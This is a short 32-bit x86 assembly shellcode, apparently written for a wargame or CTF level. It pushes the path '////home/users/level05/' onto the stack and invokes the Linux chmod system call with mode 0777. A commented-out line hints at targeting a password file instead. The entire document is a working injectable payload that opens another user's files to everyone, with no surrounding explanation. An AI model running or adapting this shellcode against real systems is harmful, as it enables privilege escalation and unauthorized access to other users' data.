[BITS 32]
section .text
global _shellcode
global _start

_start:
	call _shellcode
_shellcode:
	xor eax, eax
	push eax
	; push 0x73736170 	; pass
	push 0x002f3530		; 05/.
	push 0x6c657665		; evel
	push 0x6c2f7372	    	; rs/l
	push 0x6573752f		; /use
	push 0x656d6f68	        ; home
	
	push 0x2f2f2f2f		; ////
	mov eax, esp
	
	mov ecx, 0o777
	mov ebx, eax
	mov eax, 0xf
	int 0x80
	ret
